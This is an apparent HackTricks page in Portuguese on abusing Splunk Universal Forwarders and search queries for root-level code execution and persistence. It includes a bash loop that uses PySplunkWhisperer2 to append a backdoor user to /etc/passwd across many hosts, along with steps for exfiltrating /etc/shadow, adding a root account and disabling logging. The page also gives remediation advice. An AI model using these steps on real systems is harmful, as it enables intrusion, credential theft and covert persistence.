# Splunk LPE e Persistência

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Se ao **enumerar** uma máquina **internamente** ou **externamente** você encontrar o **Splunk em execução** (porta 8090), se você conhecer alguma **credencial válida**, você pode **abusar do serviço Splunk** para **executar um shell** como o usuário que está executando o Splunk. Se for o root, você pode escalar privilégios para root.

Além disso, se você **já for root e o serviço Splunk não estiver ouvindo apenas no localhost**, você pode **roubar** o arquivo de **senha** **do** serviço Splunk e **quebrar** as senhas, ou **adicionar novas** credenciais a ele. E manter persistência no host.

Na primeira imagem abaixo, você pode ver como uma página web do Splunkd se parece.

**As seguintes informações foram** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

## Abusando dos Encaminhadores Splunk para Shells e Persistência

14 Ago 2020

### Descrição: <a href="#description" id="description"></a>

O Agente Encaminhador Universal Splunk (UF) permite que usuários remotos autenticados enviem comandos únicos ou scripts para os agentes através da API Splunk. O agente UF não valida se as conexões que chegam são de um servidor Splunk Enterprise válido, nem valida se o código é assinado ou de outra forma comprovado ser do servidor Splunk Enterprise. Isso permite que um atacante que obtenha acesso à senha do agente UF execute código arbitrário no servidor como SYSTEM ou root, dependendo do sistema operacional.

Este ataque está sendo usado por Testadores de Penetração e provavelmente está sendo explorado ativamente no mundo real por atacantes maliciosos. Obter a senha pode levar ao comprometimento de centenas de sistemas em um ambiente de cliente.

As senhas do Splunk UF são relativamente fáceis de adquirir, veja a seção Localizações Comuns de Senhas para detalhes.

### Contexto: <a href="#context" id="context"></a>

Splunk é uma ferramenta de agregação e busca de dados frequentemente usada como um sistema de Monitoramento de Informações de Segurança e Eventos (SIEM). O Servidor Splunk Enterprise é uma aplicação web que roda em um servidor, com agentes, chamados Encaminhadores Universais, que são instalados em todos os sistemas da rede. Splunk fornece binários de agentes para Windows, Linux, Mac e Unix. Muitas organizações usam Syslog para enviar dados para o Splunk em vez de instalar um agente em hosts Linux/Unix, mas a instalação de agentes está se tornando cada vez mais popular.

O Encaminhador Universal é acessível em cada host em https://host:8089. Acessar qualquer uma das chamadas de API protegidas, como /service/, exibe uma caixa de autenticação Básica. O nome de usuário é sempre admin, e a senha padrão costumava ser changeme até 2016, quando o Splunk exigiu que todas as novas instalações definissem uma senha de 8 caracteres ou mais. Como você notará na minha demonstração, a complexidade não é um requisito, pois minha senha de agente é 12345678. Um atacante remoto pode forçar a senha sem bloqueio, o que é uma necessidade de um host de log, já que se a conta fosse bloqueada, os logs não seriam mais enviados para o servidor Splunk e um atacante poderia usar isso para esconder seus ataques. A captura de tela a seguir mostra o agente Encaminhador Universal, esta página inicial é acessível sem autenticação e pode ser usada para enumerar hosts executando o Encaminhador Universal Splunk.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

A documentação do Splunk mostra o uso da mesma senha de Encaminhamento Universal para todos os agentes, não me lembro com certeza se isso é um requisito ou se senhas individuais podem ser definidas para cada agente, mas com base na documentação e na memória de quando eu era um administrador Splunk, acredito que todos os agentes devem usar a mesma senha. Isso significa que se a senha for encontrada ou quebrada em um sistema, é provável que funcione em todos os hosts do Splunk UF. Essa tem sido minha experiência pessoal, permitindo o comprometimento de centenas de hosts rapidamente.

### Localizações Comuns de Senhas <a href="#common-password-locations" id="common-password-locations"></a>

Eu frequentemente encontro a senha em texto claro do agente Encaminhador Universal Splunk nas seguintes localizações em redes:

1. Diretório Active Directory Sysvol/domain.com/Scripts. Administradores armazenam o executável e a senha juntos para instalação eficiente do agente.
2. Compartilhamentos de arquivos de rede hospedando arquivos de instalação de TI
3. Wiki ou outros repositórios de notas de construção na rede interna

A senha também pode ser acessada em forma de hash em Program Files\Splunk\etc\passwd em hosts Windows, e em /opt/Splunk/etc/passwd em hosts Linux e Unix. Um atacante pode tentar quebrar a senha usando Hashcat, ou alugar um ambiente de quebra de hash na nuvem para aumentar a probabilidade de quebrar o hash. A senha é um hash SHA-256 forte e, como tal, uma senha forte e aleatória é improvável de ser quebrada.

### Impacto: <a href="#impact" id="impact"></a>

Um atacante com a senha do Agente Encaminhador Universal Splunk pode comprometer totalmente todos os hosts Splunk na rede e obter permissões de nível SYSTEM ou root em cada host. Eu usei com sucesso o agente Splunk em hosts Windows, Linux e Solaris Unix. Esta vulnerabilidade pode permitir que credenciais do sistema sejam despejadas, dados sensíveis sejam exfiltrados ou ransomware seja instalado. Esta vulnerabilidade é rápida, fácil de usar e confiável.

Como o Splunk lida com logs, um atacante poderia reconfigurar o Encaminhador Universal no primeiro comando executado para mudar a localização do Encaminhador, desativando o registro de logs no SIEM Splunk. Isso reduziria drasticamente as chances de ser pego pela equipe Blue Team do cliente.

O Encaminhador Universal Splunk é frequentemente instalado em Controladores de Domínio para coleta de logs, o que poderia facilmente permitir que um atacante extraísse o arquivo NTDS, desativasse o antivírus para exploração adicional e/ou modificasse o domínio.

Finalmente, o Agente Encaminhador Universal não requer uma licença e pode ser configurado com uma senha de forma independente. Como tal, um atacante pode instalar o Encaminhador Universal como um mecanismo de persistência de backdoor em hosts, já que é uma aplicação legítima que os clientes, mesmo aqueles que não usam Splunk, provavelmente não vão remover.

### Evidência: <a href="#evidence" id="evidence"></a>

Para mostrar um exemplo de exploração, configurei um ambiente de teste usando a versão mais recente do Splunk Enterprise Server e do agente Encaminhador Universal. Um total de 10 imagens foram anexadas a este relatório, mostrando o seguinte:

1- Solicitando o arquivo /etc/passwd através do PySplunkWhisper2

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Recebendo o arquivo /etc/passwd no sistema do atacante através do Netcat

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- Solicitando o arquivo /etc/shadow através do PySplunkWhisper2

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Recebendo o arquivo /etc/shadow no sistema do atacante através do Netcat

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- Adicionando o usuário attacker007 ao arquivo /etc/passwd

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- Adicionando o usuário attacker007 ao arquivo /etc/shadow

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- Recebendo o novo arquivo /etc/shadow mostrando que o attacker007 foi adicionado com sucesso

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- Confirmando o acesso SSH à vítima usando a conta do attacker007

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- Adicionando uma conta backdoor root com o nome de usuário root007, com o uid/gid definido como 0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- Confirmando o acesso SSH usando attacker007 e, em seguida, escalando para root usando root007

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

Neste ponto, tenho acesso persistente ao host tanto através do Splunk quanto através das duas contas de usuário criadas, uma das quais fornece root. Posso desativar o registro remoto para encobrir meus rastros e continuar atacando o sistema e a rede usando este host.

Scriptar o PySplunkWhisperer2 é muito fácil e eficaz.

1. Crie um arquivo com IPs dos hosts que você quer explorar, exemplo de nome ip.txt
2. Execute o seguinte:
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Informações do host:

Servidor Splunk Enterprise: 192.168.42.114\
Agente Vítima do Splunk Forwarder: 192.168.42.98\
Atacante: 192.168.42.51

Versão do Splunk Enterprise: 8.0.5 (mais recente em 12 de agosto de 2020 – dia da configuração do laboratório)\
Versão do Universal Forwarder: 8.0.5 (mais recente em 12 de agosto de 2020 – dia da configuração do laboratório)

#### Recomendações de Remediação para Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Recomendo a implementação de todas as seguintes soluções para fornecer defesa em profundidade:

1. Idealmente, o agente Universal Forwarder não teria uma porta aberta, mas sim faria sondagens ao servidor Splunk em intervalos regulares para instruções.
2. Ativar a autenticação mútua TLS entre os clientes e o servidor, usando chaves individuais para cada cliente. Isso proporcionaria uma segurança bidirecional muito alta entre todos os serviços Splunk. A autenticação mútua TLS está sendo amplamente implementada em agentes e dispositivos IoT, este é o futuro da comunicação confiável de cliente para servidor de dispositivos.
3. Enviar todo o código, arquivos de linha única ou scripts, em um arquivo comprimido que seja criptografado e assinado pelo servidor Splunk. Isso não protege os dados do agente enviados através da API, mas protege contra Execução Remota de Código maliciosa por parte de terceiros.

#### Recomendações de Remediação para clientes Splunk: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Garantir que uma senha muito forte seja definida para os agentes Splunk. Recomendo pelo menos uma senha aleatória de 15 caracteres, mas como essas senhas nunca são digitadas, isso poderia ser configurado para uma senha muito grande, como 50 caracteres.
2. Configurar firewalls baseados em host para permitir conexões à porta 8089/TCP (porta do Agente Universal Forwarder) apenas do servidor Splunk.

### Recomendações para o Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Baixar uma cópia do Splunk Universal Forwarder para cada sistema operacional, pois é um ótimo implante leve e assinado. Bom manter uma cópia caso a Splunk realmente corrija isso.

### Exploits/Blogs de outros pesquisadores <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Exploits públicos utilizáveis:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Posts de blog relacionados:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* Nota: \*\*_ Este problema é uma questão séria com os sistemas Splunk e tem sido explorado por outros testadores há anos. Embora a Execução Remota de Código seja um recurso pretendido do Splunk Universal Forwarder, a implementação disso é perigosa. Tentei submeter este bug através do programa de recompensas por bugs da Splunk na improvável chance de eles não estarem cientes das implicações do design, mas fui notificado que qualquer submissão de bugs implementa a política de divulgação Bug Crowd/Splunk que afirma que nenhum detalhe da vulnerabilidade pode ser discutido publicamente _nunca_ sem a permissão da Splunk. Solicitei um cronograma de divulgação de 90 dias e foi negado. Como tal, não divulguei isso de forma responsável, pois estou razoavelmente certo de que a Splunk está ciente do problema e optou por ignorá-lo, sinto que isso poderia impactar severamente as empresas, e é responsabilidade da comunidade de infosec educar os negócios.

## Abusando de Consultas Splunk

Informações de [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)

O **CVE-2023-46214** permitiu o upload de um script arbitrário para **`$SPLUNK_HOME/bin/scripts`** e depois explicou que usando a consulta de pesquisa **`|runshellscript script_name.sh`** era possível **executar** o **script** armazenado lá:

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar HackTricks:

* Se você quiser ver sua **empresa anunciada em HackTricks** ou **baixar HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**merchandising oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
